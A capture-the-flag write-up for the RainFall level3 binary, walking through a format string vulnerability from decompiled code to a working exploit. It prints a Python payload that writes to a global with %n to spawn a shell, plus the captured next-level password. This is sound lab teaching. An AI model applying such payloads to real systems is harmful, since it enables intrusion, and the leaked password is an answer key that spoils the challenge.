## Step 1: Static analysis

```c
080484a4    uint32_t v()
080484a4    {
080484a4        void var_20c;
080484c7        fgets(&var_20c, 512, stdin);
080484d5        printf(&var_20c);
080484da        uint32_t m_1 = m;
080484da        
080484e2        if (m_1 != 64)
08048519            return m_1;
08048519        
08048507        fwrite("Wait what?!\n", 1, 12, stdout);
08048513        return system("/bin/sh");
080484a4    }
```

```c
0804851a    int32_t main(int32_t argc, char** argv, char** envp)
0804851a    {
0804851a        return v();
0804851a    }
```

```
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
...
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
(gdb)
```

### Explanation

`v()` reads user input into a buffer (`var_20c`) using `fgets()` and then passes it directly to `printf()`.
This introduces a `format string vulnerability` because `printf()` interprets format specifiers if the input contains them.
The variable `m` (located at `0x0804988c`) is checked. If it equals `64`, the program executes a shell using `system("/bin/sh")`.
If not, it simply returns the value of `m`.

The printf call in `v()` allowing us to write `64` to the memory address of `m` (`0x0804988c`).
1. Begin the payload with the address of `m` (`0x0804988c`) in little-endian format: `\x8c\x98\x04\x08`.
2. Pad the payload with `60` characters to ensure exactly `64` characters are written before `%n`.
3. Use `%4$n` to specify that the 4th argument on the stack (our target address) should receive the value.


## Step 2: Exploit the Binary

```bash
level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + ("A" * 60) + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
% cd ../level4
% cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
